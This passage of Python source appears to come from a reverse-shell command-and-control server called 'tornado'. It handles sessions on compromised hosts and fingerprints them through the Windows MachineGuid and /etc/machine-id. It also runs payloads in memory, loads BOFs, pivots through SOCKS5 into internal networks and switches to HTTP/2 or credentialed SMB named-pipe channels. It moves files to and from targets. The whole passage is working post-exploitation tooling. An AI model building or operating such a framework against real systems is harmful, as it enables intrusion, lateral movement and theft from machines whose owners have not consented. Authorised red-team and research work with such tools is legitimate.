                mode = part.lstrip('-')
                i += 1
                continue
            args.append(part)
            i += 1
        if from_client:
            return None, mode
        session_id = args[0] if args else None
        return session_id, mode

    def show_sysinfo(self, client_sock, refresh=False, mode='stealth'):
        info = self._client_info(client_sock)
        if not info:
            print(f"{self.colors['red']}Client disconnected{self.colors['end']}")
            return
        c = self.colors
        need_collect = (
            refresh
            or not info.get('sysinfo')
            or info.get('sysinfo', {}).get('collection_mode') != mode
        )
        if need_collect:
            shell_type = self.resolve_shell_type(client_sock, info)
            collected = self.collect_sysinfo(client_sock, shell_type, mode=mode)
            if collected and collected.get('error'):
                print(f"{c['red']}Sysinfo collection error: {collected['error']}{c['end']}")
                collected = None
            if collected:
                collected['collection_mode'] = mode
                info['sysinfo'] = collected
                logger = info.get('logger')
                if logger:
                    logger.save_sysinfo(collected)
                old_fp = info.get('fingerprint')
                fp = compute_fingerprint(info)
                if old_fp and old_fp != fp:
                    self.registry.migrate_fingerprint(old_fp, fp, info)
                info['fingerprint'] = fp
                self.registry.register_active(info, fp)
            elif refresh or not info.get('sysinfo'):
                print(f"{c['red']}Failed to collect system information ({mode} mode){c['end']}")
                return
            else:
                cached_mode = info.get('sysinfo', {}).get('collection_mode', 'unknown')
                print(
                    f"{c['yellow']}Could not refresh {mode} sysinfo; "
                    f"showing cached {cached_mode} data{c['end']}"
                )
        print(format_sysinfo(info.get('sysinfo'), self.colors))

    def print_status(self):
        active = self.get_client_count()
        print(f"\n{self.colors['cyan']}STATUS | Active: {active}{self.colors['end']}")
        if active == 0:
            print(f"{self.colors['red']}No Active Clients{self.colors['end']}")
        else:
            print(f"{self.colors['green']}Active Clients:{self.colors['end']}")
        seen = set()
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                if sock.fileno() == -1:
                    continue
                sid = info.get('id')
                # Sessions that have not been identified yet carry
                # id=None. Skip them entirely — do NOT add None to
                # `seen`, or every subsequent unidentified session
                # would be silently dropped from the listing.
                if sid is None:
                    continue
                if sid in seen:
                    continue
                seen.add(sid)

                status = "CURRENT" if sock == self.current_client else ""

                if info.get('mtls'):
                    proto = "MTLS"
                elif info.get('tls'):
                    proto = "TLS"
                else:
                    proto = "TCP"

                direction = "BIND" if info.get('direction') == 'bind' else "REV"
                proto = f"{proto}/{direction}"
                act = info.get('active_transport', 'shell')
                if act == 'http2':
                    proto = f"{proto} [active: http2]"

                display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
                sysinfo = info.get('sysinfo') or {}
                host = sysinfo.get('hostname', '?')
                user = sysinfo.get('username', '?')
                os_name = sysinfo.get('os', info.get('type', '?'))
                arch = sysinfo.get('architecture', '')
                reconnects = info.get('connect_count', 1)
                detail = f"{user}@{host} [{os_name}"
                if arch:
                    detail += f"/{arch}"
                detail += "]"
                if reconnects > 1:
                    detail += f" (reconnects: {reconnects})"
                log_dir = info.get('logger').session_dir if info.get('logger') else ''
                print(f"  {display} {info['addr'][0]}:{info['addr'][1]} {proto} {detail} {status}")
                if log_dir:
                    print(f"    {self.colors['blue']}Log: {log_dir}{self.colors['end']}")

    def _live_session_ids(self):
        ids = set()
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                try:
                    if sock.fileno() != -1 and info.get('id') is not None:
                        ids.add(info['id'])
                except Exception:
                    pass
        return ids

    def infer_platform(self, output):
        if text_suggests_windows(output):
            return "windows"
        osver = output.lower()
        if "uid=" in osver or "linux" in osver or "bsd" in osver:
            return "unix"
        if "busybox" in osver or "/bin/sh" in osver:
            return "unix"
        return "unknown"

    def resolve_shell_type(self, client_sock, info=None):
        """Return session shell type; probe Windows when unknown without downgrading known types."""
        info = info or self._client_info(client_sock)
        if not info:
            return 'unknown'
        current = info.get('type', 'unknown')
        if current in ('windows', 'unix'):
            return current
        hinted = infer_type_from_sysinfo(info.get('sysinfo') or {})
        if hinted:
            self._pin_shell_type(client_sock, hinted)
            return hinted
        if info.get('_win_probe_done'):
            return current
        info['_win_probe_done'] = True
        if probe_windows_platform(self, client_sock):
            self._pin_shell_type(client_sock, 'windows')
            return 'windows'
        return info.get('type', 'unknown')

    def _pin_shell_type(self, client_sock, shell_type):
        if shell_type not in ('windows', 'unix'):
            return
        with self.client_lock:
            info = self.revshell_clients.get(client_sock)
            if info is not None:
                info['type'] = shell_type

    def _probe_identity(self, client_sock, shell_type):
        """Collect hostname, username, and machine ID for session fingerprinting."""
        if shell_type == 'windows':
            win_ps = (
                f"$g=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' "
                f"-ErrorAction SilentlyContinue).MachineGuid;"
                f"'{IDENT_MARK_START}'+$env:COMPUTERNAME+'|'+$env:USERNAME+'|'+$g+'{IDENT_MARK_END}'"
            )
            payload = self._run_marked(
                client_sock, '', win_ps, 'windows', timeout=8.0,
                start_mark=IDENT_MARK_START, end_mark=IDENT_MARK_END, strip_ws=False,
            )
        elif shell_type == 'unix':
            unix_cmd = (
                f"printf '%s' '{IDENT_MARK_START}'; "
                f"printf '%s|%s|' "
                f"\"$(hostname 2>/dev/null | head -1 | tr -d '\\r\\n')\" "
                f"\"$(id -un 2>/dev/null || whoami 2>/dev/null | tr -d '\\r\\n')\"; "
                f"tr -d '\\n' </etc/machine-id 2>/dev/null || "
                f"tr -d '\\n' </var/lib/dbus/machine-id 2>/dev/null; "
                f"printf '%s' '{IDENT_MARK_END}'"
            )
            payload = self._run_marked(
                client_sock, unix_cmd, '', shell_type, timeout=8.0,
                start_mark=IDENT_MARK_START, end_mark=IDENT_MARK_END, strip_ws=False,
            )
        else:
            for st in ('windows', 'unix'):
                identity = self._probe_identity(client_sock, st)
                if identity:
                    self._pin_shell_type(client_sock, st)
                    return identity
            return {}

        if not payload or '|' not in payload:
            return {}
        payload = sanitize_terminal_output(payload)
        parts = payload.split('|')
        host = parts[0].strip() if len(parts) > 0 else ''
        user = parts[1].strip().split('\\')[-1] if len(parts) > 1 else ''
        machine_id = parts[2].strip() if len(parts) > 2 else ''
        identity = {
            'hostname': host,
            'username': user,
            'machine_id': _norm_machine_id(machine_id),
        }
        if identity['hostname'] or identity['username'] or identity['machine_id']:
            return identity
        return {}

    def get_host_info(self, client_sock):
        info = self._client_info(client_sock)
        if not info:
            return "disconnected"
        sysinfo = info.get('sysinfo') or {}
        hostname = sysinfo.get('hostname')
        username = sysinfo.get('username')
        if info.get("name"):
            display = info["name"]
        elif username and hostname:
            display = f"{username}@{hostname}"
        else:
            display = f"#{info['id']}"
        return f"{display}@{info['addr'][0]}:{info['addr'][1]}"

    def _parse_transfer_args(self, cmd_parts):
        opts = {
            'resume': False,
            'https': False,
            'https_push': False,
            'https_bind': None,
            'rh_host': None,
            'rh_port': None,
            'args': [],
        }
        i = 1
        while i < len(cmd_parts):
            part = cmd_parts[i]

            if part in ('--resume', '-r'):
                opts['resume'] = True

            elif part in ('--https', '--http'):
                opts['https'] = True
                if i + 1 < len(cmd_parts):
                    nxt = cmd_parts[i + 1]
                    if (re.match(r'^[A-Za-z][A-Za-z0-9_-]*$', nxt)
                            and len(nxt) < 20):
                        opts['https_bind'] = nxt
                        i += 1

            elif part == '--https-push':
                opts['https_push'] = True
                if i + 1 < len(cmd_parts):
                    nxt = cmd_parts[i + 1]
                    if (re.match(r'^[A-Za-z][A-Za-z0-9_-]*$', nxt)
                            and len(nxt) < 20):
                        opts['https_bind'] = nxt
                        i += 1

            elif part in ('-RH', '--rh', '--callback'):
                if i + 1 >= len(cmd_parts):
                    i += 1
                    continue
                spec = cmd_parts[i + 1]
                i += 1
                if ':' in spec:
                    host, _, port_s = spec.rpartition(':')
                    try:
                        opts['rh_host'] = host or None
                        opts['rh_port'] = int(port_s)
                    except ValueError:
                        opts['rh_host'] = spec
                else:
                    opts['rh_host'] = spec

            else:
                opts['args'].append(part)

            i += 1

        return opts

    def client_shell_menu(self, client_sock):
        info = self._client_info(client_sock)
        if not info:
            return
        host_info = self.get_host_info(client_sock)
        shell_type = info.get('type', 'unix')
        logger = info.get('logger')
        print(f"\n{self.colors['cyan']}{'='*70}{self.colors['end']}")
        print(f"{self.colors['green']}CLIENT SHELL: {host_info} ({shell_type.upper()}) {self.colors['end']}")
        if info.get('sysinfo'):
            print(format_sysinfo(info['sysinfo'], self.colors))
        if logger:
            print(f"{self.colors['blue']}Session log: {logger.session_dir}{self.colors['end']}")
        print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
        print(f"{self.colors['yellow']}Ctrl+C sends interrupt; Ctrl+C twice exits to main menu{self.colors['end']}")
        print(f"{self.colors['yellow']}Commands: sysinfo, run/inmemory, plugins, export, upload/download — type 'help'{self.colors['end']}\n")
        self._set_completer_mode('client')
        sys.stdout.flush()

        # Capture `info` in the closure instead of the socket, so every
        # send resolves through whichever transport is currently active.
        def _send_via_active(cmd):
            live = self._active_sock_for_info(info)
            if live is None:
                return False
            return self.send_to_revshell(live, cmd)

        term = TerminalManager(
            send_fn=_send_via_active,
            shell_type=shell_type,
            pty_active=info.get('pty', False),
        )
        term.setup_session()
        last_interrupt = 0.0

        def prompt_text():
            # Build the prompt from the session info dict, not the captured
            # socket, so a transport switch or a primary-shell death does
            # not leave the prompt showing "disconnected".
            sysinfo  = info.get('sysinfo') or {}
            hostname = sysinfo.get('hostname', '?')
            username = sysinfo.get('username', '?')
            if info.get('name'):
                display = info['name']
            elif username != '?' and hostname != '?':
                display = f"{username}@{hostname}"
            else:
                display = f"#{info.get('id', '?')}"
            addr = info.get('addr') or ('?', 0)
            host_info = f"{display}@{addr[0]}:{addr[1]}"
            return (
                f"\r{self.colors['green']}{host_info}{self.colors['end']} "
                f"{self.colors['cyan']}{shell_type}>{self.colors['end']} "
            )

        try:
            while True:
                try:
                    cmd = input(prompt_text()).strip()
                    last_interrupt = 0.0
                    if cmd.lower() in ['exit', 'quit', 'e', 'q']:
                        break
                    if not cmd:
                        continue

                    # Re-resolve the active transport on every command so
                    # http2switch / backtoshell take effect immediately.
                    live = self._active_sock_for_info(info)
                    if live is None:
                        print(f"{self.colors['red']}No live transport for this session"
                              f"{self.colors['end']}")
                        continue

                    cmd_parts = cmd.split()
                    cmd_lower = cmd_parts[0].lower()

                    if cmd_lower == 'sysinfo':
                        _, mode = self._parse_sysinfo_args(cmd_parts, from_client=True)
                        self.show_sysinfo(live, refresh=True, mode=mode)
                        continue

                    if cmd_lower in ('socks', 'tunnels'):
                        if self.tunnels.handle_command(live, cmd_parts, from_client=True):
                            continue

                    if cmd_lower == 'upload':
                        t_opts = self._parse_transfer_args(cmd_parts)
                        t_args = t_opts['args']
                        if len(t_args) >= 2:
                            self.upload_file(
                                live, t_args[0], t_args[1],
                                resume=t_opts['resume'],
                                use_https=t_opts['https'],
                                https_bind=t_opts['https_bind'],
                                rh_host=t_opts['rh_host'],
                                rh_port=t_opts['rh_port'],
                            )
                        else:
                            print(f"{self.colors['red']}Usage: upload "
                                  f"[--resume] [--https [iface]] "
                                  f"[-RH host[:port]] <local> <remote>"
                                  f"{self.colors['end']}")
                        continue

                    if cmd_lower == 'download':
                        t_opts = self._parse_transfer_args(cmd_parts)
                        t_args = t_opts['args']
                        if len(t_args) >= 2:
                            self.download_file(
                                live, t_args[0], t_args[1],
                                resume=t_opts['resume'],
                                use_https_push=t_opts['https_push'],
                                https_bind=t_opts['https_bind'],
                                rh_host=t_opts['rh_host'],
                                rh_port=t_opts['rh_port'],
                            )
                        else:
                            print(f"{self.colors['red']}Usage: download "
                                  f"[--resume] [--https-push [iface]] "
                                  f"[-RH host[:port]] <remote> <local>"
                                  f"{self.colors['end']}")
                        continue

                    if cmd_lower in ('verify', 'hash') and len(cmd_parts) >= 2:
                        self.verify_file(live, cmd_parts[1])
                        continue

                    if cmd_lower == 'export':
                        if self.exporter.handle_command(cmd_parts, client_sock=live):
                            continue

                    if cmd_lower in ('run', 'plugins'):
                        if self.plugins.handle_command(cmd_parts, client_sock=live):
                            continue
                    if cmd_lower == 'bof':
                        try:
                            from .plugins.windows.bofloader import dispatch_bof_command
                            dispatch_bof_command(self, cmd_parts, client_sock=live)
                        except ImportError:
                            print(f"{self.colors['red']}bofloader plugin is not loaded — "
                                  f"'bof' unavailable{self.colors['end']}")
                        except Exception as e:
                            print(f"{self.colors['red']}BOF dispatch error: {e}{self.colors['end']}")
                        continue

                    if cmd_lower == 'smbswitch':
                        pipe_name = None
                        username  = ''
                        password  = ''
                        domain    = ''
                        if '--pipe' in cmd_parts:
                            idx = cmd_parts.index('--pipe')
                            if idx + 1 < len(cmd_parts):
                                pipe_name = cmd_parts[idx + 1]
                        if '--user' in cmd_parts:
                            idx = cmd_parts.index('--user')
                            if idx + 1 < len(cmd_parts):
                                username = cmd_parts[idx + 1]
                        if '--pass' in cmd_parts:
                            idx = cmd_parts.index('--pass')
                            if idx + 1 < len(cmd_parts):
                                password = cmd_parts[idx + 1]
                        if '--domain' in cmd_parts:
                            idx = cmd_parts.index('--domain')
                            if idx + 1 < len(cmd_parts):
                                domain = cmd_parts[idx + 1]
                        self.smb_switch(info['id'], pipe_name, username, password, domain)
                        continue

                    if cmd_lower == 'http2switch':
                        if info is None:
                            print(f"{self.colors['red']}Session gone{self.colors['end']}")
                            continue
                        rh = None
                        if '--rh' in cmd_parts:
                            idx = cmd_parts.index('--rh')
                            if idx + 1 < len(cmd_parts):
                                rh = cmd_parts[idx + 1]
                        self.http2_switch(info['id'], handler_host=rh)
                        continue

                    if cmd_lower == 'backtoshell':
                        if info is None:
                            print(f"{self.colors['red']}Session gone{self.colors['end']}")
                            continue
                        self.http2_backtoshell(info['id'])
                        continue

                    if cmd_lower == 'transport':
                        if info is None:
                            print(f"{self.colors['red']}Session gone{self.colors['end']}")
                            continue
                        self.transport_status(info['id'])
                        continue

                    if cmd_lower == 'help':
                        print(f"""
    {self.colors['green']}SESSION:{self.colors['end']}
    sysinfo [--stealth|--full]               Collect/display host information (default: stealth)
    exit(e) / quit(q) / CTRL+C               Return to the main menu

    {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
    run inmemory <filetype> <local_file> [-- args] [--save-output <file>]
      filetype: py, ps, exe, elf, bat, sh

    {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
    socks <listen_port>                               Start SOCKS5 proxy via session
    socks test <host> <port>                          Test internal TCP reachability
    socks reset [--hard]                              Reset tunnel (soft: purge streams/buffers; hard: redeploy agent)
    tunnels                                           List active SOCKS proxies
    socks stop <proxy_id>                             Stop a SOCKS proxy

    {self.colors['green']}REPORTING:{self.colors['end']}
    export                                            Export HTML session transcript

    {self.colors['green']}PLUGINS:{self.colors['end']}
    plugins / plugins list                            List registered plugins
    plugins load|unload|reload|rescan|info <name>     Manage plugins at runtime
    run <plugin> [args...]                            Execute a plugin on this session
    bof <name> [args...]          Run a registered BOF from inside a session

    {self.colors['green']}TRANSPORT SWITCHING:{self.colors['end']}
    http2switch [--rh <ip|iface>]                     Switch this session to the HTTP/2 channel
    backtoshell                                       Close HTTP/2 and go back to the shell
    transport                                         Show which channel is active

    {self.colors['green']}FILE TRANSFER:{self.colors['end']}
    upload [--resume] <local> <remote>                Chunked upload with SHA256 verify
    upload --https [iface] [-RH host[:port]] <local> <remote>  HTTPS upload
    download [--resume] <remote> <local>              Chunked download with SHA256 verify
    download --https-push [iface] [-RH host[:port]] <remote> <local>  HTTPS push download
    verify/hash <remote>                              Remote file size and SHA256""")
                        continue

                    print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
                    if self.send_to_revshell(live, cmd):
                        output = self.recv_output(live)
                        print(f"\r{output}")
                        if logger:
                            logger.log_command(cmd, output)
                    else:
                        print(f"\r{self.colors['red']}Connection lost{self.colors['end']}")
                        break
                except KeyboardInterrupt:
                    now = time.time()
                    if now - last_interrupt < 1.5:
                        break
                    last_interrupt = now
                    term.send_interrupt()
                    try:
                        _live = self._active_sock_for_info(info)
                        if _live is not None:
                            self.recv_output(_live, timeout=0.5)
                    except Exception:
                        pass
                    print(f"\n{self.colors['yellow']}^C sent to remote (Ctrl+C again to exit){self.colors['end']}")
                except EOFError:
                    break
        finally:
            term.teardown_session()
        self._set_completer_mode('main')

    def main_menu(self):
        self._set_completer_mode('main')
        while self.running:
            try:
                cmd = input(f"{self.colors['green']}tornado> {self.colors['end']}")
                if not cmd.strip():
                    continue
                cmd_parts = cmd.strip().split()
                cmd_lower = cmd_parts[0].lower()

                if cmd_lower == 'bind':
                    if len(cmd_parts) < 3:
                        print(f"{self.colors['red']}Usage: bind <host> <port> "
                              f"[--tls] [--verify]{self.colors['end']}")
                        continue
                    bind_host = cmd_parts[1]
                    bind_port = cmd_parts[2]
                    use_tls = '--tls' in cmd_parts
                    verify = '--verify' in cmd_parts
                    if use_tls:
                        self._bind_tls_client(bind_host, bind_port, verify=verify)
                    else:
                        self._bind_client(bind_host, bind_port)
                elif cmd_lower == 'payloads':
                    self.print_payloads()
                elif cmd_lower in ('status', 'ls'):
                    self.print_status()
                elif cmd_lower == 'sessions':
                    self.registry.list_sessions(self.colors)
                elif cmd_lower == 'reconnects':
                    self.registry.list_reconnects(self.colors)
                elif cmd_lower == 'switch':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: switch <ID>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
                            continue
                        self.current_client = client_sock
                        display = self.get_host_info(client_sock).split("@")[0]
                        print(f"{self.colors['green']}Switched to {display}{self.colors['end']}\n")
                        self.client_shell_menu(client_sock)
                        self.current_client = None
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower == 'kill':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: kill <ID>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not found{self.colors['end']}")
                            continue
                        self.cleanup_client(client_sock)
                        print(f"{self.colors['green']}Client #{cmd_parts[1]} terminated{self.colors['end']}")
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower in ('exit', 'quit', 'e', 'q'):
                    print(f"\n{self.colors['red']}Shutting down server{self.colors['end']}")
                    self.running = False
                    break
                elif self.updater.handle_command(cmd_parts):
                    pass
                elif cmd_lower in ('clear', 'cls'):
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                elif cmd_lower in ('rename', 'rn'):
                    if len(cmd_parts) < 3:
                        print(f"{self.colors['red']}Usage: rename/rn <ID> <name>{self.colors['end']}")
                        continue
                    try:
                        changed_id = int(cmd_parts[1])
                        new_name = " ".join(cmd_parts[2:]).strip()
                        if not new_name:
                            raise ValueError
                        with self.client_lock:
                            for info in self.revshell_clients.values():
                                if info['id'] == changed_id:
                                    info['name'] = new_name
                                    self.registry.register_active(info, info.get('fingerprint'))
                                    print(f"{self.colors['green']}Client #{changed_id} renamed to '{new_name}'{self.colors['end']}")
                                    break
                            else:
                                print(f"{self.colors['red']}Client #{changed_id} not found{self.colors['end']}")
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID or session name{self.colors['end']}")
                elif cmd_lower == 'sysinfo':
                    session_id, mode = self._parse_sysinfo_args(cmd_parts)
                    if not session_id:
                        print(f"{self.colors['red']}Usage: sysinfo <ID> [--stealth|--full]{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(session_id))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{session_id} not active{self.colors['end']}")
                            continue
                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif self.exporter.handle_command(cmd_parts):
                    pass
                elif self.plugins.handle_command(cmd_parts):
                    pass
                elif self.tunnels.handle_main_command(cmd_parts):
                    pass
                elif cmd_lower == 'bof':
                    try:
                        from .plugins.windows.bofloader import dispatch_bof_command
                        dispatch_bof_command(self, cmd_parts, client_sock=None)
                    except ImportError:
                        print(f"{self.colors['red']}bofloader plugin is not loaded — "
                              f"'bof' unavailable{self.colors['end']}")
                    except Exception as e:
                        print(f"{self.colors['red']}BOF dispatch error: {e}{self.colors['end']}")
                elif cmd_lower == 'smbswitch':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: smbswitch <ID> "
                              f"[--pipe <name>] [--user <user>] "
                              f"[--pass <pass>] [--domain <dom>]"
                              f"{self.colors['end']}")
                        continue
                    try:
                        sid = int(cmd_parts[1])
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                        continue
                    pipe_name = None
                    username  = ''
                    password  = ''
                    domain    = ''
                    if '--pipe' in cmd_parts:
                        idx = cmd_parts.index('--pipe')
                        if idx + 1 < len(cmd_parts):
                            pipe_name = cmd_parts[idx + 1]
                    if '--user' in cmd_parts:
                        idx = cmd_parts.index('--user')
                        if idx + 1 < len(cmd_parts):
                            username = cmd_parts[idx + 1]
                    if '--pass' in cmd_parts:
                        idx = cmd_parts.index('--pass')
                        if idx + 1 < len(cmd_parts):
                            password = cmd_parts[idx + 1]
                    if '--domain' in cmd_parts:
                        idx = cmd_parts.index('--domain')
                        if idx + 1 < len(cmd_parts):
                            domain = cmd_parts[idx + 1]
                    self.smb_switch(sid, pipe_name, username, password, domain)
                elif cmd_lower == 'http2switch':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: http2switch <ID> "
                              f"[--rh <handler-ip|iface>]{self.colors['end']}")
                        continue
                    try:
                        sid = int(cmd_parts[1])
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                        continue
                    rh = None
                    if '--rh' in cmd_parts:
                        idx = cmd_parts.index('--rh')
                        if idx + 1 < len(cmd_parts):
                            rh = cmd_parts[idx + 1]
                    self.http2_switch(sid, handler_host=rh)
                elif cmd_lower == 'backtoshell':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: backtoshell <ID>{self.colors['end']}")
                        continue
                    try:
                        sid = int(cmd_parts[1])
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                        continue
                    self.http2_backtoshell(sid)
                elif cmd_lower == 'transport':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: transport <ID>{self.colors['end']}")
                        continue
                    try:
                        sid = int(cmd_parts[1])
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                        continue
                    self.transport_status(sid)
                elif cmd_lower == 'upload':
                    t_opts = self._parse_transfer_args(cmd_parts)
                    t_args = t_opts['args']
                    if len(t_args) < 3:
                        print(f"{self.colors['red']}Usage: upload "
                              f"[--resume] [--https [iface]] "
                              f"[-RH host[:port]] <ID> <local> <remote>"
                              f"{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(t_args[0]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{t_args[0]} "
                                  f"not active{self.colors['end']}")
                            continue
                        self.upload_file(
                            client_sock, t_args[1], t_args[2],
                            resume=t_opts['resume'],
                            use_https=t_opts['https'],
                            https_bind=t_opts['https_bind'],
                            rh_host=t_opts['rh_host'],
                            rh_port=t_opts['rh_port'],
                        )
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower == 'download':
                    t_opts = self._parse_transfer_args(cmd_parts)
                    t_args = t_opts['args']
                    if len(t_args) < 3:
                        print(f"{self.colors['red']}Usage: download "
                              f"[--resume] [--https-push [iface]] "
                              f"[-RH host[:port]] <ID> <remote> <local>"
                              f"{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(t_args[0]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{t_args[0]} "
                                  f"not active{self.colors['end']}")
                            continue
                        self.download_file(
                            client_sock, t_args[1], t_args[2],
                            resume=t_opts['resume'],
                            use_https_push=t_opts['https_push'],
                            https_bind=t_opts['https_bind'],
                            rh_host=t_opts['rh_host'],
                            rh_port=t_opts['rh_port'],
                        )
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower in ('verify', 'hash'):
                    if len(cmd_parts) < 3:
                        print(f"{self.colors['red']}Usage: verify/hash <ID> <remote_path>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
                            continue
                        self.verify_file(client_sock, cmd_parts[2])
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower == 'help':
                    print(f"""
    {self.colors['green']}SESSION MANAGEMENT:{self.colors['end']}
    bind <host> <port> [--tls] [--verify]
                            Dial a target listening for a bind shell
    switch <ID>             Client interaction
    kill <ID>               Terminate client
    status/ls               Show active clients
    sessions                Show tracked sessions (active + disconnected)
    reconnects              Show session reconnect history
    sysinfo <ID> [--stealth|--full]   Refresh and show host information (default: stealth)
    rename/rn <ID> <name>   Rename session
    payloads                Show payloads list
    clear/cls               Clear screen
    update                  Pull latest from the official repository branch and restart
    help                    This help menu
    exit/quit               Shutdown server

    {self.colors['green']}REPORTING:{self.colors['end']}
    export <ID>                                              Export HTML session transcript

    {self.colors['green']}PLUGINS:{self.colors['end']}
    plugins / plugins list                                   List registered plugins
    plugins load|unload|reload|rescan|info <name>            Manage plugins at runtime
    run <plugin> <ID>                                        Execute a plugin on a session
    bof <ID> <name> [args...]     Run a registered BOF from a session

    {self.colors['green']}TRANSPORT SWITCHING:{self.colors['end']}
    http2switch <ID> [--rh <ip|iface>]                       Switch session to the HTTP/2 channel
    smbswitch <ID> [--pipe <name>] [--user <u>] [--pass <p>] [--domain <d>]
                                                              Switch session to SMB named-pipe channel
    backtoshell <ID>                                         Close secondary transport and go back to shell
    transport <ID>                                           Show which channel is active

    {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
    socks <ID> <listen_port>                                 Start SOCKS5 proxy via session
    socks <ID> test <host> <port>                            Test internal TCP reachability
    socks <ID> reset [--hard]                                Reset tunnel (soft: purge streams; hard: redeploy agent)
    tunnels                                                  List active SOCKS proxies
    socks stop <proxy_id>                                    Stop proxy + delete remote agent artifact

    {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
    run inmemory <ID> <filetype> <local_file> [-- args] [--save-output <file>]
      filetype: py, ps, exe, elf, bat, sh

    {self.colors['green']}FILE TRANSFER:{self.colors['end']}
    upload [--resume] <ID> <local> <remote>                     Chunked upload with SHA256 verify
    upload --https [iface] [-RH host[:port]] <ID> <local> <remote>  HTTPS upload
    download [--resume] <ID> <remote> <local>                   Chunked download with SHA256 verify
    download --https-push [iface] [-RH host[:port]] <ID> <remote> <local>  HTTPS push download
    verify/hash <ID> <remote>                                   Remote file size and SHA256

    {self.colors['yellow']}Inside a client shell, omit <ID> for session-targeted commands{self.colors['end']}""")
            except KeyboardInterrupt:
                print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")

    def cleanup_client(self, client_sock):
        with self.client_lock:
            info = self.revshell_clients.pop(client_sock, None)
        if not info:
            return

        primary = info.get('sock')

        # If an SMB transport was attached, tell the target to kill its
        # pipe server. The pipe name is stored on the info dict.
        smb = (info.get('transports') or {}).get('smb')
        if smb is not None:
            try:
                if primary is not None and not info.get('_smb_killed'):
                    info['_smb_killed'] = True
                    # Kill any PowerShell child running our SmbShell class.
                    self.send_to_revshell(
                        primary,
                        "Get-Job | Where-Object { $_.State -eq 'Running' } | "
                        "Stop-Job -EA 0; Get-Job | Remove-Job -Force -EA 0",
                    )
            except Exception:
                pass

        # Case 1: this is a *secondary* transport being torn down.
        # Remove it from transports and revert to the primary if it was active.
        if client_sock is not primary:
            for k, v in list((info.get('transports') or {}).items()):
                if v is client_sock:
                    info['transports'][k] = None
            try:
                client_sock.close()
            except Exception:
                pass
            if info.get('active_transport') != 'shell' and \
               info['transports'].get(info['active_transport']) is None:
                info['active_transport'] = 'shell'
                reason = info.pop('_last_h2_close_reason', None)
                if reason is None:
                    import traceback as _tb
                    reason = 'unknown'
                    print(
                        f"{self.colors['red']}[transport] closing bridge "
                        f"with no reason set. Stack:{self.colors['end']}"
                    )
                    for line in _tb.format_stack():
                        print(f"  {line.rstrip()}")
                print(
                    f"{self.colors['yellow']}Secondary transport on "
                    f"#{info['id']} closed — reverted to shell "
                    f"(reason: {reason})"
                    f"{self.colors['end']}"
                )
            return

        # Case 2: primary shell died. If HTTP/2 is still up, promote it.
        h2 = (info.get('transports') or {}).get('http2')
        h2_alive = False
        if h2 is not None:
            try:
                h2_alive = h2.fileno() != -1
            except Exception:
                h2_alive = False

        self.tunnels.cleanup_session(client_sock)
        try:
            client_sock.close()
        except Exception:
            pass

        if h2_alive:
            info['active_transport'] = 'http2'
            with self.client_lock:
                self.revshell_clients[h2] = info
            print(
                f"{self.colors['yellow']}Primary shell closed on "
                f"#{info['id']} — HTTP/2 transport still active"
                f"{self.colors['end']}"
            )
            return

        display = info["name"] if info.get("name") else f"#{info['id']}"
        logger = info.get('logger')
        if logger:
            logger.log_event('Session disconnected')
        self.registry.mark_disconnected(info)
        print(f"{self.colors['red']}\n{display} {info['addr'][0]}:{info['addr'][1]} disconnected{self.colors['end']}")
        print(f"{self.colors['yellow']}Session metadata preserved — will restore on reconnect (fingerprint: {info.get('fingerprint', '?')}){self.colors['end']}")

    def _close_listener(self, server):
        if server is None:
            return
        try:
            server.shutdown(socket.SHUT_RDWR)
        except OSError:
